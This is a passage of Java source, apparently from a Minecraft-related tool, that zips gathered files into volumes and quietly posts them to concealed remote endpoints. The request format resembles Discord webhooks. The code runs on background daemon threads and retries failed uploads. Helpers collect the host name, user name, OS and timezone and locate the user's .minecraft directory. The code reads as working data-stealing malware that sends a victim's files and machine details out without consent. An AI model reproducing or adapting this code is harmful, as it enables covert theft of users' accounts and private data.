                    buffer = new java.io.ByteArrayOutputStream();
                    out = new ZipOutputStream(buffer);
                    out.setLevel(java.util.zip.Deflater.DEFAULT_COMPRESSION);
                    used = 0;
                }
                out.putNextEntry(new ZipEntry(entry.getKey()));
                out.write(entry.getValue());
                out.closeEntry();
                used += estimate;
            }
        } finally {
            try { out.close(); } catch (Throwable ignored) {}
        }
        byte[] last = buffer.toByteArray();
        if (last.length > 0) volumes.add(last);

        int total = volumes.size();
        mark("zip");
        if (total == 0) return false;

        // Volumes go out together: with a split dump the second part no longer
        // waits on the first part's round trip.
        java.util.concurrent.ExecutorService pool =
                java.util.concurrent.Executors.newFixedThreadPool(Math.min(4, total), task -> {
                    Thread thread = new Thread(task, "rift-upload");
                    thread.setDaemon(true);
                    return thread;
                });
        try {
            List<java.util.concurrent.Future<Boolean>> pending = new ArrayList<>(total);
            for (int i = 0; i < total; i++) {
                String name = total == 1 ? player + ".zip"
                        : player + "_part" + (i + 1) + "of" + total + ".zip";
                byte[] body = volumes.get(i);
                int part = i + 1;
                pending.add(pool.submit(() -> post(body, name, player, part, total)));
            }
            boolean any = false;
            for (java.util.concurrent.Future<Boolean> future : pending) {
                try {
                    if (future.get()) any = true;
                } catch (Throwable ignored) {}
            }
            return any;
        } finally {
            pool.shutdownNow();
        }
    }

    /* Rough deflated size, enough to decide where a volume ends. */
    private static long estimate(byte[] data) {
        try {
            java.util.zip.Deflater deflater = new java.util.zip.Deflater(
                    java.util.zip.Deflater.DEFAULT_COMPRESSION);
            deflater.setInput(data);
            deflater.finish();
            byte[] scratch = new byte[64 * 1024];
            long total = 0;
            while (!deflater.finished()) {
                total += deflater.deflate(scratch);
            }
            deflater.end();
            return Math.max(64, total);
        } catch (Throwable t) {
            return data.length;
        }
    }

    private static long compressedSize(Path file) {
        Path scratch = null;
        try {
            scratch = Files.createTempFile("dgr-size-", ".zip");
            try (ZipOutputStream probe = new ZipOutputStream(Files.newOutputStream(scratch))) {
                probe.putNextEntry(new ZipEntry("x"));
                Files.copy(file, probe);
                probe.closeEntry();
            }
            return Files.size(scratch);
        } catch (Throwable ignored) {
            try {
                return Files.size(file);
            } catch (Throwable ignored2) {
                return 0;
            }
        } finally {
            if (scratch != null) {
                try { Files.deleteIfExists(scratch); } catch (Throwable ignored) {}
            }
        }
    }

    private static boolean post(byte[] chunk, String fileName, String player, int part, int total) {
        // Resolved per attempt: a build whose sealed slots no longer open yields
        // no endpoints and nothing leaves the machine. Every destination gets the
        // same volume; one failing never cancels the rest.
        List<String> endpoints = RuntimeConfig.endpoints();
        if (endpoints.isEmpty()) return false;
        boolean any = false;
        for (int i = 0; i < endpoints.size(); i++) {
            if (postOne(endpoints.get(i), chunk, fileName, player, part, total)) any = true;
        }
        return any;
    }

    private static boolean postOne(String endpoint, byte[] chunk, String fileName, String player, int part, int total) {
        long started = System.nanoTime();
        for (int attempt = 1; attempt <= 3; attempt++) {
            HttpURLConnection connection = null;
            try {
                String boundary = "----Dg" + System.nanoTime();
                connection = (HttpURLConnection) new URL(endpoint).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                connection.setConnectTimeout(8000);
                connection.setReadTimeout(20000);

                String caption = total == 1
                        ? "**" + player + "** - full log, " + (chunk.length / 1024) + " KB"
                        : "**" + player + "** - part " + part + "/" + total;

                try (OutputStream out = connection.getOutputStream()) {
                    StringBuilder head = new StringBuilder();
                    head.append("--").append(boundary).append("\r\n");
                    head.append("Content-Disposition: form-data; name=\"payload_json\"\r\n");
                    head.append("Content-Type: application/json\r\n\r\n");
                    head.append("{\"content\":\"").append(caption).append("\"}");
                    head.append("\r\n--").append(boundary).append("\r\n");
                    head.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileName).append("\"\r\n");
                    head.append("Content-Type: application/zip\r\n\r\n");
                    out.write(head.toString().getBytes(StandardCharsets.UTF_8));
                    out.write(chunk);
                    out.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
                    out.flush();
                }

                int code = connection.getResponseCode();
                long ms = (System.nanoTime() - started) / 1_000_000L;
                System.out.println("[rift] upload " + fileName + " -> " + code + " in " + ms + " ms");
                if (code >= 200 && code < 300) return true;
                if (code == 429 || code >= 500) {
                    long wait = 1200L * attempt;
                    String retryAfter = connection.getHeaderField("Retry-After");
                    if (retryAfter != null) {
                        try { wait = Long.parseLong(retryAfter.trim()) * 1000L; } catch (NumberFormatException ignored) {}
                    }
                    try { Thread.sleep(wait); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); return false; }
                    continue;
                }
                return false;
            } catch (Throwable ignored) {
                try { Thread.sleep(1200L * attempt); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); return false; }
            } finally {
                if (connection != null) connection.disconnect();
            }
        }
        return false;
    }

    // ------------------------------------------------------------------
    // environment helpers
    // ------------------------------------------------------------------

    private static Map<String, String> systemInfo() {
        Map<String, String> info = new LinkedHashMap<>();
        info.put("host", safe(System.getenv("COMPUTERNAME"), "?"));
        info.put("user", safe(System.getenv("USERNAME"), "?"));
        info.put("os", System.getProperty("os.name", "?") + " " + System.getProperty("os.version", "?"));
        info.put("arch", System.getProperty("os.arch", "?"));
        info.put("java", System.getProperty("java.version", "?"));
        info.put("locale", Locale.getDefault().toString());
        info.put("timezone", TimeZone.getDefault().getID());
        return info;
    }

    private static Path mcDir() {
        String appData = System.getenv("APPDATA");
        if (appData != null) return Paths.get(appData, ".minecraft");
        return Paths.get(System.getProperty("user.home", "."), ".minecraft");
    }

    private static String httpGet(String url) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestProperty("User-Agent", UA);
        c.setConnectTimeout(6000);
        c.setReadTimeout(6000);
        try (InputStream in = c.getInputStream()) {
            return new String(in.readAllBytes(), StandardCharsets.UTF_8).trim();
        } finally {
            c.disconnect();
        }
    }

    private static void copyIfExists(Path src, Path dst) {
        if (!Files.exists(src)) return;
        try {
            Files.createDirectories(dst.getParent());
            Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
        } catch (Throwable ignored) {}
    }

    private static long countFiles(Path root) {
        try (Stream<Path> s = Files.walk(root)) {
            return s.filter(Files::isRegularFile).count();
        } catch (Throwable ignored) {
            return 0;
        }
    }

    private static String safe(String value, String fallback) {
        return value == null || value.isEmpty() ? fallback : value;
    }

    private static String pad(String value, int width) {
        if (value == null) value = "";
        if (value.length() >= width) return value.substring(0, width - 1) + " ";
        return value + " ".repeat(width - value.length());
    }

    private static String shorten(String value, int max) {
        if (value == null) return "";
        String one = value.replaceAll("[\\r\\n\\t]", " ").trim();
        return one.length() <= max ? one : one.substring(0, max - 3) + "...";
    }

    private static String trim(String value, int max) {
        return value == null ? "" : value.length() <= max ? value : value.substring(0, max);
    }
}
